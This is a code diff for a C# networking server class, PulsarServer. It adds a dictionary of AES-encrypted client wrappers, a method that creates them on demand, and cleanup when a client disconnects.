@@ -2,6 +2,7 @@ using Pulsar.Common.Cryptography;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Other;
 using System;
+using System.Collections.Generic;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
@@ -12,9 +13,14 @@ using dnlib;
 using Pulsar.Server.Models;
 
 namespace Pulsar.Server.Networking
-{
+{    
     public class PulsarServer : Server
     {
+        /// <summary>
+        /// Dictionary to store secure client wrappers for AES encryption
+        /// </summary>
+        private readonly Dictionary<Client, SecureServerClient> _secureClients = new Dictionary<Client, SecureServerClient>();
+
         /// <summary>
         /// Gets the clients currently connected and identified to the server.
         /// </summary>
@@ -67,7 +73,7 @@ namespace Pulsar.Server.Networking
         /// </summary>
         /// <param name="client">The disconnected client.</param>
         public delegate void ClientDisconnectedEventHandler(Client client);
-
+        
         /// <summary>
         /// Fires an event that informs subscribers that the client is disconnected.
         /// </summary>
@@ -75,8 +81,38 @@ namespace Pulsar.Server.Networking
         private void OnClientDisconnected(Client client)
         {
             if (ProcessingDisconnect || !Listening) return;
+            
+            // clean up secure client wrapper
+            if (_secureClients.ContainsKey(client))
+            {
+                _secureClients.Remove(client);
+            }
+            
             var handler = ClientDisconnected;
             handler?.Invoke(client);
+        }
+        
+        /// <summary>
+        /// Gets the secure client wrapper for a client (always creates one since AES encryption is always enabled)
+        /// </summary>
+        /// <param name="client">The base client</param>
+        /// <returns>SecureServerClient wrapper</returns>
+        public SecureServerClient GetSecureClient(Client client)
+        {
+            if (_secureClients.ContainsKey(client))
+                return _secureClients[client];
+
+            try
+            {
+                var secureClient = SecureServerClient.CreateWithManagedKey(client);
+                _secureClients[client] = secureClient;
+                return secureClient;
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"Failed to create secure client wrapper: {ex.Message}");
+                return null;
+            }
         }
 
         /// <summary>
